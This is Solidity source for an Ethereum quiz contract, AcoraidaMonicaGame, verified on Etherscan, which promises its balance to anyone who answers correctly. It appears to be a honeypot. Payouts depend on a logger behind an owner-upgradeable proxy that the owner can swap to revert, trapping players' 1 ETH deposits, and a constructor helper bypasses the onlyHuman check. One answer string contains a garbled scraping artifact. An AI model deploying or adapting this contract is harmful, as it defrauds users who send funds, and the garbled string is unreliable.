/**
 *Submitted for verification at Etherscan.io on 2019-07-31
*/

pragma solidity =0.4.25;

contract AcoraidaMonicaGame{
    uint256 public version = 4;
    string public description = "Acoraida Monica admires smart guys, she'd like to pay 10000ETH to the one who could answer her question. Would it be you?";
    string public constant sampleQuestion = "Who is Acoraida Monica?";
    string public constant sampleAnswer = "$*!&#^[` [email protected];Ta&*T` R`<`~5Z`^5V You beat me! :D";
    Logger public constant logger=Logger(0x5e351bd4247f0526359fb22078ba725a192872f3);
    address questioner;
    string public question;
    bytes32 private answerHash;

    constructor(bytes a) {
    }
    modifier onlyHuman{
        uint size;
        address addr = msg.sender;
        assembly { size := extcodesize(addr) }
        require(size==0);
        _;
    }
    function Start(string _question, string _answer) public payable{
        if(answerHash==0){
            answerHash = keccak256(_answer);
            question = _question;
            questioner = msg.sender;
        }
    }
    function NewRound(string _question, bytes32 _answerHash) public payable{
        if(msg.sender == questioner && msg.value >= 0.5 ether){
            require(_answerHash != keccak256(sampleAnswer));
            question = _question;
            answerHash = _answerHash;
            logger.AcoraidaMonicaWantsToKnowTheNewQuestion(_question);
            logger.AcoraidaMonicaWantsToKnowTheNewAnswerHash(_answerHash);
        }
    }
    function TheAnswerIs(string _answer) onlyHuman public payable{
        //require(msg.sender != questioner);
        if(answerHash == keccak256(_answer) && msg.value >= 1 ether){
            questioner = msg.sender;
            msg.sender.transfer(address(this).balance);
            logger.AcoraidaMonicaWantsToKeepALogOfTheWinner(msg.sender);
        }
    }
    /*function setLogger(address _log) public {
        require(msg.sender == questioner);
        logger = Logger(_log);
    }*/
    function () payable {}
}
contract LoggerAgent{
    bytes32 private constant ownerSlot = keccak256("Acoraida Monica is cute :P");
    bytes32 private constant implSlot = keccak256("So is her logger :D");
    constructor() public{
        setAddress(ownerSlot, msg.sender);
    }
    
    modifier onlyOwner{
        require(owner()==msg.sender);
        _;
    }
    function getAddress(bytes32 _slot) internal view returns (address value) {
        bytes32 s = _slot;
        assembly {value := sload(s)}
    }
    function setAddress(bytes32 _slot, address _address) internal {
        bytes32 s = _slot;
        assembly {sstore(s, _address)}
    }
    
    function owner() public view returns (address){
        return getAddress(ownerSlot);
    }
    function implementation() public view returns (address){
        return getAddress(implSlot);
    }

    function setOwner(address _owner) onlyOwner public{
        setAddress(ownerSlot, _owner);
    }
    /* call this when I want to change log's implementation */
    function upgrade(address _impl) onlyOwner public {
        setAddress(implSlot, _impl);
    }

    function _delegateforward(address _impl) internal {
        assembly {
            calldatacopy(0, 0, calldatasize)
            let result := delegatecall(gas, _impl, 0, calldatasize, 0, 0)
            returndatacopy(0, 0, returndatasize)
            switch result
            case 0 {revert(0, returndatasize)}
            default {return(0, returndatasize)}
        }
    }
    function () payable public{
        _delegateforward(implementation());
    }
}
contract Logger{
    event WeHaveAWinner(address);
    event NewQuestion(string);
    event NewAnswerHs(bytes32);
    function AcoraidaMonicaWantsToKeepALogOfTheWinner(address winner) public {
        emit WeHaveAWinner(winner);
    }
    function AcoraidaMonicaWantsToKnowTheNewQuestion(string _question) public{
        emit NewQuestion(_question);
    }
    function AcoraidaMonicaWantsToKnowTheNewAnswerHash(bytes32 _answerHash) public {
        emit NewAnswerHs(_answerHash);
    }
}

contract b{
    function Start(string _question, string _answer) public payable;
}
contract a{
    constructor(address t, string q, string r) public{
        b(t).Start(q,r);
    }
}
